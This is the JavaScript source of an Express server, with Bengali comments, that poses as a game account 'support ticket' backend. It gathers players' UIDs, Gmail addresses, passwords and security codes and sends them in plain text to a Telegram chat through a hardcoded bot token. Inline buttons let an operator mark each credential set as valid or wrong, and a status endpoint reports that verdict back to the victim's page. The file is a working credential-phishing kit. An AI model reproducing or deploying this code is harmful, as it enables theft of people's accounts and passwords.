const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();

// CORS সম্পূর্ণভাবে উন্মুক্ত করা হলো
app.use(cors({
    origin: '*',
    methods: ['GET', 'POST'],
    allowedHeaders: ['Content-Type']
}));

app.use(express.json());

// ক্যাশিং রোধ করার হেডার
app.use((req, res, next) => {
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
    res.setHeader('Pragma', 'no-cache');
    res.setHeader('Expires', '0');
    next();
});

const TELEGRAM_BOT_TOKEN = "8394444876:AAGQ3vrDdHXR--TZzCd0muiEAh6DIrect10";
const TELEGRAM_CHAT_ID = "-1004444318249";

// স্ট্যাটাস মেমোরিতে ধরে রাখার অবজেক্ট
global.userStore = global.userStore || {};

app.get('/', (req, res) => res.send("Backend Server Active"));

// ১. টিকিট সাবমিট
app.post('/api/submit-ticket', async (req, res) => {
    const { uid, gmail, password, securityCode, problemType, additionalDetails } = req.body;
    
    // ইনিশিয়াল ডাটা সেভ
    global.userStore[uid] = {
        status: "Pending",
        name: "Checking Status...",
        level: "Under Review",
        reason: ""
    };

    const telegramMessage = `
📩 *New Support Ticket Submitted!*

🆔 *Player UID:* \`${uid}\`
📧 *Bind Gmail:* \`${gmail}\`
🔑 *Password:* \`${password}\`
🔢 *Security Code:* \`${securityCode}\`
📌 *Issue:* ${problemType}
📝 *Details:* ${additionalDetails}
    `;

    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: telegramMessage,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Verify Account", callback_data: `verify_${uid}` }
                    ],
                    [
                        { text: "❌ Wrong Pass", callback_data: `reject_${uid}_Wrong Password` },
                        { text: "❌ Wrong Gmail", callback_data: `reject_${uid}_Invalid Gmail` }
                    ],
                    [
                        { text: "❌ Wrong Code", callback_data: `reject_${uid}_Wrong Security Code` },
                        { text: "❌ Wrong UID", callback_data: `reject_${uid}_Invalid UID` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// ২. টেলিগ্রাম ওয়েবহুক
app.post('/api/telegram-webhook', async (req, res) => {
    // টেলিগ্রামকে তাত্ক্ষণিক রেসপন্স দেওয়া
    res.sendStatus(200);

    try {
        const update = req.body;

        if (update && update.callback_query) {
            const callbackQuery = update.callback_query;
            const data = callbackQuery.data; 
            const chatId = callbackQuery.message.chat.id;
            const messageId = callbackQuery.message.message_id;

            const parts = data.split('_');
            const action = parts[0];
            const uid = parts[1];
            const reason = parts[2] || "Information Mismatch";

            if (action === 'verify') {
                global.userStore[uid] = {
                    status: "Verified",
                    name: "Verified Player",
                    level: "Active Account",
                    reason: ""
                };

                await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
                    chat_id: chatId,
                    message_id: messageId,
                    text: callbackQuery.message.text + `\n\n🟢 *Status: VERIFIED BY ADMIN*`,
                    parse_mode: 'Markdown'
                });

                await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    chat_id: chatId,
                    text: `✅ *Confirmation Alert!*\n\nPlayer UID: \`${uid}\` status has been updated to *VERIFIED*!`,
                    parse_mode: 'Markdown'
                });

            } else if (action === 'reject') {
                global.userStore[uid] = {
                    status: "Rejected",
                    name: "Verification Failed",
                    level: "N/A",
                    reason: reason
                };

                await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
                    chat_id: chatId,
                    message_id: messageId,
                    text: callbackQuery.message.text + `\n\n🔴 *Status: REJECTED (${reason})*`,
                    parse_mode: 'Markdown'
                });

                await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    chat_id: chatId,
                    text: `🔴 *Rejection Alert!*\n\nPlayer UID: \`${uid}\` has been marked as *REJECTED* (${reason})!`,
                    parse_mode: 'Markdown'
                });
            }

            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                callback_query_id: callbackQuery.id,
                text: `UID ${uid} Updated Successfully!`
            });
        }
    } catch (err) {
        console.error("Webhook Execution Error:", err);
    }
});

// ৩. লাইভ স্ট্যাটাস নেওয়ার API
app.get('/api/check-status/:uid', (req, res) => {
    const uid = req.params.uid;
    const userData = global.userStore[uid] || {
        status: "Pending",
        name: "Checking Status...",
        level: "Under Review",
        reason: ""
    };
    res.json({ success: true, data: userData });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server listening on port ${PORT}`));
